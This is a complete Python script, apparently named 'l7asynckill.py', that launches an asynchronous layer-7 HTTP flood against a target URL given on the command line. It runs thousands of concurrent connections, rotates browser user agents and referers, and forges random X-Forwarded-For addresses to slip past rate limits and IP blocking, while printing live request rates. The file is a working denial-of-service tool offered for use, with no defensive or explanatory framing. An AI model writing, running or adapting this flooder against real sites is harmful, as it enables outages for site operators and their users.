import asyncio
import aiohttp
import random
import sys
import time
from collections import defaultdict

if len(sys.argv) < 2:
    print("Usage: python l7asynckill.py <target_url> [connections] [duration]")
    sys.exit(1)

target = sys.argv[1]
connections = int(sys.argv[2]) if len(sys.argv) > 2 else 2000
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/119.0.6045.109 Mobile/15E148 Safari/604.1"
]

referers = [
    "https://google.com", "https://bing.com", "https://yahoo.com", "https://duckduckgo.com",
    "https://facebook.com", "https://twitter.com", "https://instagram.com", "https://youtube.com",
    "https://reddit.com", "https://linkedin.com", "https://tiktok.com", "https://snapchat.com"
]

request_count = 0
error_count = 0

async def flood(session, url):
    global request_count, error_count
    headers = {
        'User-Agent': random.choice(user_agents),
        'Referer': random.choice(referers),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    }
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)) as resp:
            await resp.read()
            request_count += 1
    except:
        error_count += 1

async def worker(session, url, stop_event):
    while not stop_event.is_set():
        await flood(session, url)
        await asyncio.sleep(0)  # memberi kesempatan event loop untuk task lain

async def main():
    global request_count
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, use_dns_cache=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        stop_event = asyncio.Event()
        tasks = []
        for _ in range(connections):
            tasks.append(asyncio.create_task(worker(session, target, stop_event)))
        
        start = time.time()
        end = start + duration
        
        # Monitor thread untuk print statistik setiap 2 detik
        def monitor():
            last_count = 0
            while time.time() < end:
                time.sleep(2)
                now = time.time()
                elapsed = now - start
                total = request_count
                rps = (total - last_count) / 2
                last_count = total
                print(f"[{elapsed:.0f}s] Total: {total} | RPS: {rps:.0f} | Errors: {error_count}")
        import threading
        monitor_thread = threading.Thread(target=monitor, daemon=True)
        monitor_thread.start()
        
        await asyncio.sleep(duration)
        stop_event.set()
        await asyncio.gather(*tasks, return_exceptions=True)
        
        elapsed = time.time() - start
        print(f"\nFinished. Total requests: {request_count} | Time: {elapsed:.2f}s | Avg RPS: {request_count/elapsed:.0f}")

if __name__ == "__main__":
    print(f"Target: {target}")
    print(f"Concurrent connections: {connections}")
    print(f"Duration: {duration} seconds")
    print("Launching async L7 flood...")
    asyncio.run(main())
